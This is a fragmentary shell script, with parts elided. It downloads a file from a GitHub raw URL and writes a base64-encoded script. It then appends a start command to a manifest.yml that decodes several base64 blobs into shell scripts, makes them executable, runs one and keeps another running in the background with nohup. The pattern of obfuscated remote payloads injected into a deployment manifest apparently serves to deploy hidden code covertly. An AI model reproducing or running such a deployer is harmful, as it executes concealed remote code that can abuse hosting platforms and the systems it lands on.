...
mkdir phpv3
cd phpv3
wget https://raw.githubusercontent.com/A233S/angti/main/phpv3 -O phpv3
    reb=$(base64 -w 0 << EOF
#!/bin/sh
...
echo '  command: base64 -d phpv3 > go.sh && base64 -d reb1 > rec.sh && base64 -d reb2 > rebst.sh && chmod +x ./go.sh ./rebst.sh&& ./go.sh && nohup ./rebst.sh &' >>manifest.yml
